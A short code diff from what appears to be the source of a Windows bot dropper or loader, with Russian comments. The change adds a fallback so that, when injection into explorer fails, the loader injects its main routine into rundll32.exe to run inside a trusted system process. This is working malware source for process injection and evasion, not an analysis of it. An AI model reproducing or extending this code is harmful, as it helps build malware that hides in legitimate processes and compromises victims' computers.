@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <ShlObj.h>
 
 #include "BotCore.h"
 #include "DLLLoader.h"
@@ -129,6 +130,21 @@ DWORD WINAPI DropperMainProc(LPVOID)
 	return 0; 
 }
 
+//---------------------------------------------------
+//  StartMainFunc
+//  Промежуточная функция запуска основного процесса
+//  загрузчика в свхосте
+//  предназначено для запуска через доверенный 
+//  процесс
+//---------------------------------------------------
+DWORD WINAPI StartMainFunc(LPVOID)
+{
+	BOT::Initialize();
+	MegaJump(DropperMainProc);
+	pExitProcess(0);
+	return 0;
+}
+
 /*
 BOOL CALLBACK WndEnumCallBak(HWND Wnd, LPARAM Param)
 {
@@ -167,11 +183,16 @@ int APIENTRY LoaderMain()
 		DropperPID = GetCurrentProcessId();
 		GetModuleFileNameA(NULL, DropperName, MAX_PATH);
 
-		bool InExplorer = false;
+		BOOL InExplorer = FALSE;
 		if (!IsWIN64())
 			InExplorer = InjectIntoExplorer(DropperMainProc) != FALSE;
 		if (!InExplorer)
-			MegaJump(DropperMainProc);
+		{
+			// Инжект не удался, запускаем основную функцию через свхост
+			string ExeName = GetSpecialFolderPathA(CSIDL_SYSTEM, "rundll32.exe");
+			if (!InjecIntoProcessByNameA(ExeName.t_str(), NULL, StartMainFunc))
+				MegaJump(DropperMainProc);
+		}
 	} 
 
 	
